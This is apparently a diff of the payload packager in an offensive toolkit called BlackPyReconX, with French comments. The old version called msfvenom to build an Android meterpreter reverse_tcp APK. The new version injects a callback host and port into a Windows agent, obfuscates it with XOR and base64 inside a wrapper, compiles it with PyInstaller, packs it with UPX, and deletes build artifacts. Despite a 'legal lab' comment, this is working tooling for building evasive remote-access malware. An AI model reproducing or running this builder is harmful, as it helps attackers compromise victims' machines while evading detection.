@@ -1,105 +1,105 @@
 # build/packager.py
 
 import os
+import random
+import string
 import subprocess
-import argparse
-from pathlib import Path
+import base64
 import shutil
-import sys
 
-def build_executable(script_path, name="payload", onefile=True):
+# 📦 Import config globale
+try:
+    from core.config import LHOST, LPORT
+except:
+    LHOST, LPORT = "127.0.0.1", 4444  # fallback si .env non chargé
+
+BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
+AGENT_FILE = os.path.join(BASE_DIR, "agents", "windows", "agent_win.py")
+WRAPPER_TEMPLATE = os.path.join(BASE_DIR, "build", "template_wrapper.py")
+WRAPPER_OUTPUT = os.path.join(BASE_DIR, "build", "temp_wrapper.py")
+OUTPUT_DIR = os.path.join(BASE_DIR, "build", "output")
+os.makedirs(OUTPUT_DIR, exist_ok=True)
+
+XOR_KEY = 13  # Clé de chiffrement simple pour lab légal
+
+def random_string(length=10):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+
+def xor_encrypt(data, key):
+    return ''.join([chr(ord(c) ^ key) for c in data])
+
+def inject_wrapper(encoded_payload, xor_key):
+    with open(WRAPPER_TEMPLATE, "r", encoding="utf-8") as f:
+        template = f.read()
+
+    wrapper_final = template.replace("<ENCRYPTED_B64_PAYLOAD>", f'"{encoded_payload}"')
+    wrapper_final = wrapper_final.replace("XOR_KEY = 13", f"XOR_KEY = {xor_key}")
+
+    with open(WRAPPER_OUTPUT, "w", encoding="utf-8") as f:
+        f.write(wrapper_final)
+
+    print("[✔] Wrapper injecté avec le payload.")
+
+def compile_exe(output_name="payload_windows.exe", icon_path=None, compress=True):
     cmd = [
-        sys.executable, "-m", "PyInstaller",
-        script_path,
-        "--name", name,
-        "--distpath", "build/dist",
-        "--workpath", "build/build",
-        "--specpath", "build/spec",
-        "--clean"
-    ]
-    if onefile:
-        cmd.append("--onefile")
-
-    print(f"[+] Construction de {name} depuis {script_path}")
-    try:
-        subprocess.run(cmd, check=True)
-        print(f"✅ Payload généré : build/dist/{name}.exe")
-    except subprocess.CalledProcessError as e:
-        print(f"❌ Échec génération avec PyInstaller : {e}")
-        sys.exit(1)
-
-def copy_script(source_path: Path, output_name: str):
-    output_dir = Path("build/dist")
-    output_dir.mkdir(parents=True, exist_ok=True)
-    output_file = output_dir / f"{output_name}.sh"
-    shutil.copy(source_path, output_file)
-    print(f"✅ Script copié : {output_file}")
-
-def build_android_payload(lhost: str, lport: str):
-    output_path = Path("agents/android/payload.apk")
-    output_path.parent.mkdir(parents=True, exist_ok=True)
-
-    print(f"[+] Génération payload Android (.apk) avec LHOST={lhost} LPORT={lport}")
-
-    cmd = [
-        "msfvenom",
-        "-p", "android/meterpreter/reverse_tcp",
-        f"LHOST={lhost}",
-        f"LPORT={lport}",
-        "-o", str(output_path)
+        "pyinstaller",
+        "--noconfirm",
+        "--onefile",
+        "--clean",
+        "--name", output_name.replace(".exe", ""),
+        "--distpath", OUTPUT_DIR,
+        WRAPPER_OUTPUT
     ]
 
-    try:
-        subprocess.run(cmd, check=True)
-        print(f"✅ Payload Android généré : {output_path}")
-    except subprocess.CalledProcessError as e:
-        print(f"❌ Échec génération avec msfvenom : {e}")
-        sys.exit(1)
+    if icon_path and os.path.exists(icon_path):
+        cmd += ["--icon", icon_path]
+
+    print("[*] Compilation avec PyInstaller...")
+    subprocess.run(cmd, check=True)
+
+    exe_path = os.path.join(OUTPUT_DIR, output_name)
+
+    if compress:
+        print("[*] Compression UPX...")
+        subprocess.run(["upx", "--best", "--lzma", exe_path], check=True)
+
+    print(f"[✔] Payload final généré : {exe_path}")
+
+def clean():
+    for item in ["build", "__pycache__", WRAPPER_OUTPUT]:
+        path = os.path.join(BASE_DIR, item) if item != WRAPPER_OUTPUT else item
+        if os.path.exists(path):
+            if os.path.isdir(path):
+                shutil.rmtree(path)
+            else:
+                os.remove(path)
+    for f in os.listdir(BASE_DIR):
+        if f.endswith(".spec"):
+            os.remove(os.path.join(BASE_DIR, f))
 
 def main():
-    parser = argparse.ArgumentParser(description="🔧 Générateur de payloads BlackPyReconX")
-    parser.add_argument("--target", choices=["windows", "android", "unix"], required=True,
-                        help="Cible de génération de payload")
-    parser.add_argument("--lhost", help="Adresse IP pour reverse shell (Android)")
-    parser.add_argument("--lport", help="Port pour reverse shell (Android)")
-    args = parser.parse_args()
+    print("[*] Lecture de l'agent...")
+    with open(AGENT_FILE, "r", encoding="utf-8") as f:
+        code = f.read()
 
-    base_dir = Path(__file__).resolve().parent.parent
+    # 🔁 Remplacement dynamique LHOST / LPORT avant chiffrement
+    code = code.replace("LHOST_PLACEHOLDER", f'"{LHOST}"')
+    code = code.replace("LPORT_PLACEHOLDER", f"{LPORT}")
 
-    if args.target == "android":
-        if not args.lhost or not args.lport:
-            print("❌ Veuillez spécifier --lhost et --lport pour Android")
-            sys.exit(1)
-        build_android_payload(args.lhost, args.lport)
-        return
+    print("[*] Chiffrement XOR + encodage base64...")
+    encrypted = xor_encrypt(code, XOR_KEY)
+    encoded = base64.b64encode(encrypted.encode()).decode()
 
-    targets = {
-        "windows": {
-            "path": base_dir / "modules" / "exploit_sys.py",
-            "name": "payload_windows"
-        },
-        "unix": {
-            "path": base_dir / "agents" / "linux" / "agent_linux.py",
-            "name": "payload_unix"
-        }
-    }
+    print("[*] Injection du wrapper...")
+    inject_wrapper(encoded, XOR_KEY)
 
-    selected = targets[args.target]
-    path = selected["path"]
-    name = selected["name"]
+    print("[*] Compilation...")
+    compile_exe()
 
-    if not path.exists():
-        print(f"❌ Fichier introuvable : {path}")
-        sys.exit(1)
+    print("[*] Nettoyage...")
+    clean()
 
-    ext = path.suffix.lower()
-    if ext == ".py":
-        build_executable(str(path), name=name)
-    elif ext == ".sh":
-        copy_script(path, name)
-    else:
-        print(f"❌ Extension non prise en charge : {ext}")
-        sys.exit(1)
+    print("[✔] Payload prêt dans : build/output/")
 
 if __name__ == "__main__":
     main()
